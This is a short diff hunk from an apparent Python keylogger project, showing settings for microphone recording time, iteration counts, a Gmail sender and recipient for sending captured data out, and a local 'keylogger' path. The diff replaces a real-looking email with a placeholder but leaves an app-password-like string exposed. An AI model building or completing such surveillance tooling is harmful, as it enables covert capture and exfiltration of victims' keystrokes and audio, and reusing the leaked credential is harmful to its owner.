@@ -42,10 +42,10 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = ("wonlypans@gmail.com")
+email_address = ("abc@gmail.com")
 password = ("llry gujd xclh gamt")
 
-toaddr = "wonlypans@gmail.com"
+toaddr = "abc@gmail.com"
 
 file_path = r"C:\Users\LENOVO\PycharmProjects\PythonProject\keylogger"
 extend = "\\"
